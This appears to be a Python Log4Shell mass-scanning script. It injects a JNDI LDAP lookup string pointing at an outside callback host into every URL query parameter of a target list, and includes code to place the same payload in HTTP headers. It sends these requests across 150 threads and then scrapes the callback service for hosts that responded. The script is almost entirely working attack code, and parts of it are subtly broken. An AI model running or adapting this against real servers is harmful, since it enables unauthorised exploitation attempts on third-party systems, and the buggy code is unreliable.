
from urllib.parse import parse_qs, urlparse , urlsplit
try:
    import urlparse
except ImportError:
    import urllib.parse as urlparse
from urllib.parse import urlencode
import requests
import os
import sys
import mechanize
from collections import OrderedDict
import urllib.request
import urllib

from requests import get
from urllib3 import disable_warnings
import concurrent.futures
from bs4 import BeautifulSoup
import json
out = []
found_hosts = []
hosts = []
CONNECTIONS = 150
TIMEOUT = 3
url_tampering = []
get_inj_tests = []
possible_ssrf_sinks = []
scrape_post_urls = []

huntress_view_url_json = 'https://log4shell.huntress.com/json/'+sys.argv[2]
huntress_view_url = 'https://log4shell.huntress.com/view/'+sys.argv[2]
payload = '${jndi:ldap://log4shell.huntress.com:1389/'+sys.argv[2]+'}'


def Banner():
    banner = """ 
    **                           **          **       ****   **  **
   /**                 *****    */*         /**      */// * /** /**
   /**        ******  **///**  * /*   ******/**     /    /* /** /**
   /**       **////**/**  /** ****** **//// /******    ***  /** /**
   /**      /**   /**//******/////* //***** /**///**  /// * /** /**
   /**      /**   /** /////**    /*  /////**/**  /** *   /* /** /**
   /********//******   *****     /*  ****** /**  /**/ ****  *** ***
   ////////  //////   /////      /  //////  //   //  ////  /// /// 
   Wabfet & several internet resources
   
   Press Enter To Commence
   """
    print(banner+"\n")
    
def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def get_huntress_callbacks(view_url):
    
    headers = {
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-GPC': '1',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'en-US,en;q=0.9',
      }

    try:
       response = requests.get(view_url, headers=headers,verify=False,timeout=10)
       if response:
          data = []
          soup = BeautifulSoup(response.text)
          table = soup.find('table', attrs={'class':'table'})
          table_body = table.find('tbody')
          rows = table_body.find_all('tr')
          for row in rows:
              cols = row.find_all('td')
              cols = [ele.text.strip() for ele in cols]
              data.append([ele for ele in cols if ele]) # Get rid of empty values
          if data:
             print(data)
             
             
    except Exception as uhoh:
       print(uhoh)  
       
       
    
def get_fuzzing_headers(payload,default_headers):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open('headers.txt', "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})


    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers
    
    
        
def sendDetectionRequest(url,time):
    try:
    
        headers = {'User-Agent':payload, 'Referer':payload}
        fuzzies = get_fuzzing_headers(payload,headers)   
        url = url.strip()
        print('[{}] Testing {}'.format(url))
        
        get(url, headers=fuzzies, verify=False,  timeout=time)
        
        
    except Exception as e:
        print(e)
        pass
        
        

def parse_url(url):
    try:
       print(url)
       parsed = urllib.parse.urlparse(url,allow_fragments=False)
    
       if parsed.query:
       
        
          if url not in get_inj_tests:
             get_inj_tests.append(url)
      
        
          else:
           
              if url not in scrape_post_urls:
                 scrape_post_urls.append(url)

    except Exception as shit:
        print(shit)
        pass
    


#parse the get requests out of the file and reassemble with log4j poison
#for urls that have gets that are valid if not put log4j test string as get
def prepare_get_requests(url_file,log4j_pay):
    tamper_ready = []
    unparsed_urls = open(url_file,'r',encoding='utf-8')
    for urls in unparsed_urls:
        try:
           parse_url(urls)

        except:
            pass
    print("*"*50)       
    print("Detected:"+ str(len(get_inj_tests)))
    print("*"*50)
    
    clean_list = set(OrderedDict.fromkeys(get_inj_tests))
    reaasembled_url = ""
    results_crawled = ""
    for query_test in clean_list:
        url_clean = urllib.parse.unquote(query_test)

        url_object = urllib.parse.urlparse(url_clean,allow_fragments=False)
        
        #parse query paramaters
        url_query = query_test.split("?")[1].strip()

        #https://stackoverflow.com/questions/50058154/parsing-query-parameters-in-python
        dicty = {x[0] : x[-1] for x in [x.split("=") for x in url_query.split("&") ]}

        query_pairs = OrderedDict([(k,v) for k,vlist in dicty.items() for v in vlist])
        
        reaasembled_url = "http://" + str(url_object.netloc) + str(url_object.path) +  '?'

        temp_sqli_query = {}
        #here we will manipulate the url paramters and create a basic vuln scanner
        for k,v in dicty.items():
            entry_data_local = {k:v + log4j_pay}
            temp_sqli_query.update(entry_data_local)
        reaasembled_query = urlencode(temp_sqli_query)
        full_url = reaasembled_url + reaasembled_query
        tamper_data = {}
        tamper_data['original_url'] = url_clean
        tamper_data['tampered_url'] = full_url

        url_tampering.append(json.dumps(tamper_data))
        tamper_ready.append(json.dumps(tamper_data))
        
    return tamper_ready     
    
    
def load_url(url, timeout):
    with urllib.request.urlopen(url, timeout=timeout) as conn:
        return conn.read()



def back_to_the_future(urls):  

    print("Generated: "+str(len(urls))+" urls")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONNECTIONS) as executor:
       future_to_url = (executor.submit(load_url, url, TIMEOUT) for url in set(urls))
       
       for future in concurrent.futures.as_completed(future_to_url):
           try:
              data = future.result()

              if data:
                 found_hosts.append(data)
           except Exception as exc:
              data = exc
              pass
              
def main():
    Banner()
    input("Log4Sh3ll Locked and loaded Commencing Sweep\n")
    attacks_lobbed = []
    threads = []
    urlList = []
    urlId = 0
    #pass in targets file and jndi string
    targets = prepare_get_requests(sys.argv[1],payload)
    if targets:
       for items in targets:
           tmp_item = json.loads(items)
           print(tmp_item['tampered_url'])
           if tmp_item['tampered_url']:
              urlList.append(tmp_item['tampered_url'].strip())
    
   
  
    split_lists = list(chunks(urlList, 1000))



   
    for lists in split_lists:
        back_to_the_future(lists)
     
    
    try:
       get_huntress_callbacks(huntress_view_url)
    except Exception as ex:
      print(ex)
      pass
    
main()
